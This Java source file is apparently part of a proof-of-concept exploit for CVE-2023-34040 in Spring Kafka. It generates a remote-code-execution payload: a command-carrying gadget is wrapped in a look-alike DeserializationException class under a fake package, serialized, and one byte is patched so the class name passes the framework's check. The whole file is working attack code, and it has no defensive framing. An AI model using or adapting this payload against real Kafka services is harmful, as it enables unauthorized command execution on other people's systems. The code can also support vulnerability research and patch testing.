package com.example.utils;

/**
 * @program: CVE-2023-34040
 * @description: payload generator
 * @author: Jasper_sec
 * @date: 2025-03-06 11:37
 **/

import com.example.gadget.ProcBuilder;
import xrg.springframework.kafka.support.serializer.DeserializationException;


public class PayloadGenerator {
    public static byte[] getRCEPayload(String s) throws Exception {
        ProcBuilder builder = new ProcBuilder();
        builder.addCommandInNotBeanStandardWay(s);
        DeserializationException exception = new DeserializationException(builder);
        byte[] data = SerializeUtils.serializeToBytes(exception);
        // this changes the fully qualified name of the root class from
        // xrg.springframework.kafka.supporter.serializer.DeserializationException
        // to
        // org.springframework.kafka.supporter.serializer.DeserializationException
        // so that it matches the expected class name and bypasses the check.
        data[8] = "o".getBytes()[0];
        return data;
    }
}
